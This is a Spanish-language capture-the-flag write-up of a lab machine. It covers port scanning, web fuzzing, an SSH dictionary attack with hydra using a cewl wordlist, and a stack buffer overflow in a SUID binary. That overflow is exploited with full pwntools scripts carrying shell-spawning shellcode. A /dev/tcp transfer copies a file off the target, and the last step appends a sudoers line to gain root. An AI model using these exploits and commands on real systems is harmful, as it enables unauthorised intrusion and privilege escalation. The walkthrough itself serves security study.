## Enumeracion de Puertos, Servicios y Versiones

```ruby
nmap -Pn -n -sS -p- --open -sCV --min-rate 5000 172.17.0.2
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-18 23:20 -03
Nmap scan report for 172.17.0.2
Host is up (0.0000020s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 66:a8:c9:41:2e:c3:e1:07:64:ed:ee:ae:e6:51:62:47 (ECDSA)
|_  256 8e:0e:15:2f:87:76:09:78:ee:e1:0c:49:18:24:3b:a2 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Sender - La Herramienta de Conexi\xC3\xB3n Definitiva
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.82 seconds
```


el reporte de nmap me muestra solo 2 puertos abiertos, ssh y http, por lo que comienzo chequeando el servicio web

![image](https://github.com/user-attachments/assets/7cca2093-2b13-4d32-b073-fa6553bc4a0f)

la web trata sobre una app llamada `sender` y parece que es una app para establecer comunicaciones, en principio le realizo fuzzing web

```ruby
feroxbuster -u 'http://172.17.0.2' -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x txt,php,bak,db,py,html,js,jpg,png,git,sh -t 200 --random-agent --no-state -d 10 -C 404
```

![image](https://github.com/user-attachments/assets/c130c56d-1b81-4667-85b2-779ec09752ef)

no observo nada, asi que me descargo la app `sender`

```ruby
wget http://172.17.0.2/sender
```

antes de ejecutar el binario, primero lo analizo

![image](https://github.com/user-attachments/assets/94f15a30-3187-42fc-bddf-f806c0cabe74)

al parecer el binario solicita 2 parametros (ip y puerto), establece una conexion y solicita los datos a transmitir, no parece ser malicioso por lo que
procedo a ejecutarlo (no como root)

![image](https://github.com/user-attachments/assets/793786f8-78ac-4c2f-bdd4-c9f093345a14)

no parece ser muy interesante el binario, no tiene nada que me sirva para explotar y acceder al servidor `172.17.0.2`, por otro lado esta el servicio `ssh` pero no tengo
usuarios; sin embargo en la web existen par de nombres los cuales despues de probar en el servicio `ssh` un ataque de diccionario no obtengo resultados, asi que hago uso de
`cewl` para recolectar las palabras de la web y crear un diccionario e intentar con este diccionario aplicar nuevamente un ataque de diccionario

```ruby
cewl http://172.17.0.2 -w wordlist
```

![image](https://github.com/user-attachments/assets/7eee0ff2-4b96-44a3-8374-75d7c27d5d65)

```ruby
hydra -L users -P wordlist ssh://172.17.0.2 -F
```

![image](https://github.com/user-attachments/assets/4257dc57-12d0-4041-8890-e53033a60124)

accedo al sistema

![image](https://github.com/user-attachments/assets/185d6cb5-8d31-4daf-a7a7-c8a52edc6be5)


## Esclada de Privilegios

### alex

si listo el contenido del directorio del user `alex` observo un archivo con permisos `SUID`

![image](https://github.com/user-attachments/assets/17bb87d0-6162-495f-88cd-bc2805e18132)

si chequeo de que se trata

![image](https://github.com/user-attachments/assets/84cfe9ad-204c-4d7c-b56d-92544f36b692)

se trata de un binario, asi que lo ejecuto a ver de que va esto

![image](https://github.com/user-attachments/assets/c5f8a7f7-e78f-489f-93f2-e7985e5d104a)

se coloca en escucha por el puerto `7777` asi que testeo

![image](https://github.com/user-attachments/assets/3a924e3f-8135-4ab8-8584-d25c59b2d254)


continuo testeando

![image](https://github.com/user-attachments/assets/6006a802-7563-43fb-b81d-6645e6503f6f)

ocurrio un fallo de segmentacion, por lo que el binario es propenso a un desbordamiento de buffer, asi que me lo paso a mi maquina atacante para analizar 

```ruby

cat server > /dev/tcp/172.17.0.1/6000 # en la maquina comprometida (172.17.0.2)

nc -lnvp 6000 > server # en mi maquina atacante
```


![image](https://github.com/user-attachments/assets/07b7c4bb-220c-4e3d-a0dd-45c3a8b4f008)

chequeo las protecciones del binario

![image](https://github.com/user-attachments/assets/11cb0156-76a7-4dbb-8e30-d60772a24ef6)


ahora lo ejecuto con el depurador `gdb`

```ruby
chmod +x server && gdb ./server -q
```

![image](https://github.com/user-attachments/assets/404ef75a-5f0a-4f49-9587-6b9ff21640c1)

ahora haciendo uso de 2 exploit de metasploit intentare calcular el `offset`

```ruby
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500
```

![image](https://github.com/user-attachments/assets/c9eb8f61-153b-4406-b07b-c98b2a87b3f9)


esta cadena se la envio al binario `server`

![image](https://github.com/user-attachments/assets/8c8d7592-1c38-4d55-bd27-3b528c697112)

la direccion `0x63413563` corresponde al `EIP` asi que le pasamos este valor al segundo exploit que usaremos de metasploit

```ruby
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x63413563
```

![image](https://github.com/user-attachments/assets/4bccd166-c78b-405b-ba90-97cc51d91b28)

tenemos un offset de 76 byte asi que testeare si llego a controlar el registro `EIP`, pero para esto me creare un exploit 


exploit
```python
from pwn import *

def explotation():

    OFFSET = 76
    BUFF = b"A"*OFFSET
    EIP = b"BBBB"
    host = "172.17.0.1"
    port = 7777
    payload = BUFF + EIP
    l = remote(host, port)
    l.sendline(payload)


if __name__ == '__main__':
    explotation()

```

le doy permisos de ejecucion, corro el binario nuevamente con el depurador y ejecuto el exploit

![image](https://github.com/user-attachments/assets/3065fc5a-da60-40ad-9bca-56fa5abe07d7)

en efecto tengo el control del registro `EIP`, ahora enviare NOP's despues del `EIP` para localizar las direcciones de memorias en la que se almacenan (agrego tambien la shellcode que usare)



`Exploit`
```python
from pwn import *
def explotation():
    OFFSET = 76
    BUFF = b"F"*OFFSET
    #SHELLCODE
    shellcode = b"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
    #SHELLCODE
    EIP =  b"MMMM"

    host = "172.17.0.1"
    port = 7777

    payload = BUFF + EIP + b"\x90"*150
    l = remote(host, port)
    l.sendline(payload)

if __name__ == '__main__':
    explotation()
```

ahora ejecuto el binario `server` con el depurador y lanzo el exploit

![image](https://github.com/user-attachments/assets/1f0f3576-04c4-40ea-8102-fa6d2610ec13)

luego inspecciono la memoria para localizar las direcciones donde se alojan los NOP's

![image](https://github.com/user-attachments/assets/2e195d40-cda1-48c5-9977-78b987e542ce)

lo mas recomendable es hacer uso de una direccion de memoria intermedia por lo que hare uso de `0xffffcc10` y vuelvo a modificar el exploit

```python
from pwn import *
def explotation():
    OFFSET = 76
    BUFF = b"F"*OFFSET
    #SHELLCODE
    shellcode = b"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
    #SHELLCODE
    EIP =  b"\x10\xcc\xff\xff"  
    host = "172.17.0.1"
    port = 7777

    payload = BUFF + EIP + b"\x90"*150 + shellcode
    l = remote(host, port)
    l.sendline(payload)

if __name__ == '__main__':
    explotation()
```

ejecuto el exploit mientra esta corriendo el binario dentro del depurador

![image](https://github.com/user-attachments/assets/3d0151e1-a5cb-4c21-8d2e-ac6561a7248a)

he obtenido una shell, ahora lo que hare sera apuntar el exploit contra el host comprometido `172.17.0.2` y correr el binario en dicha maquina

![image](https://github.com/user-attachments/assets/fd301c35-e5b1-44d6-86c2-df7c5819b11e)

en principio no me funciona pero me doy cuenta que la maquina objetivo tiene instalado el depurador asi que analizo el binario nuevamente pero desde la propia maquina
objetivo y lo unico que necesito buscar el la direccion de memoria a donde apuntar, asi que corro el binario con el depurador y lanzo el exploit 

![image](https://github.com/user-attachments/assets/251aa53d-e08a-4e48-811d-46be47b37ff7)

ahora inspecciono la memoria para buscar la direccion que necesito

![image](https://github.com/user-attachments/assets/df9276dc-8c55-4cde-b4a3-e66e80ad6d93)

por esto no funciono en principio el exploit, las direcciones de memorias no son las mismas, asi que vuelvo a tomar una direccion intermedia para modificar el exploit,
en este caso usare `0xffffd320`

![image](https://github.com/user-attachments/assets/dd3fc4df-9d4b-4a26-8418-716610bce9e0)

ahora si funciona y obtengo una shell, pero esto debo volver hacerlo desde fuera del depurador

![image](https://github.com/user-attachments/assets/f31bbfc3-e035-43db-a856-c5405489958a)

esta shell aunque no es completamente `root` por tener tan solo el `euid=root` igual me es funcional para una escalada 100% a `root` asi que ejecuto lo siguiente

```ruby
echo 'alex ALL=(root) ALL' >> /etc/sudoers
```

![image](https://github.com/user-attachments/assets/4bb56924-1632-4443-8f28-d1c4e9b23ab3)

despues de agregar el user `alex` al archivo `/etc/sudoers` para que ejecute lo que quiera como `root`, puedo escarlar con `sudo su` + la password de `alex`

## PWNED-ROOT

























